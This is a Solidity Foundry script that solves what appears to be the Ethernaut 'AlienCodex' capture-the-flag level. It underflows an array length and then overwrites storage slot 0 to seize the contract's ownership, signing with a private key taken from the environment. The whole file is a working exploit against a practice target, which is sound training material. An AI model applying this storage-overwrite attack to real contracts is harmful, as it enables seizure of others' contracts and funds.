// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IAlienCodex{
    function makeContact() external; 
    function retract()  external; 
    function revise(uint256 i, bytes32 _content) external;
}

contract Attacker {
    IAlienCodex level;

    constructor(address level_) {
        level = IAlienCodex(level_);
    }

    function attack() public {
        level.makeContact();

        level.retract();

        uint256 slotCodex =  uint(keccak256(abi.encode(1)));
        uint256 slotTarget;
        unchecked {
            slotTarget = 0 - slotCodex;
        }

        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        level.revise(slotTarget, myAddress);
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x76fC80CEDE65348d96FD4e03d0f0e2Feb46Dfd66;

        Attacker attacker = new Attacker(levelAddr);

        attacker.attack();

        vm.stopBroadcast();
    }
}
